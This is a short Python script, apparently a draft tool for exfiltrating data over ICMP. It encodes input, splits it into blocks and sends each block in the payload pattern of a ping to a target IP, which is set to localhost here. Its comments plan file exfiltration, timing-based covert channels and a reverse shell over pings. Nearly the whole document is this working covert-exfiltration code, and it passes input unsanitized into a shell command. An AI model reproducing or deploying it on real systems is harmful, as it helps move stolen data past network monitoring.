import os, sys, base64

# different methods of exfiltration:
# - time-based (server and client pre-establish time diff, maybe pattern)
# - Timestamp-binary
# - data-based (remaining bytes - more noisy)
#
# maybe option to add a reverse shell: server on client, receives
# data from pings, sends back data with pings.

def dataFile(filename):
    f = open(filename, "r")
    content = f.read()
    f.close()

    return content

def exfiltrate(data, ip):

    # add final signal to stop receiving data
    string = base64.b64encode(data).encode("hex") + "0a"

    # split into blocks to send message
    blocks = []
    for i in range(0, len(string), 32):
        blocks.append(string[i:i+32])

    # make last block padded
    blocks[-1] = blocks[-1] + (32 - len(blocks[-1])) * "0"

    # send blocks one by one
    for i in blocks:
        os.system("ping -c1 -p {} {}".format(i, ip))

if __name__ == "__main__":

    data = sys.argv[1]
    ip = "127.0.0.1"

    # add argparse support for file exfiltration or simple info

    if data:

        # if file flag is set:
        #   data = dataFile(data)

        exfiltrate(data, ip)
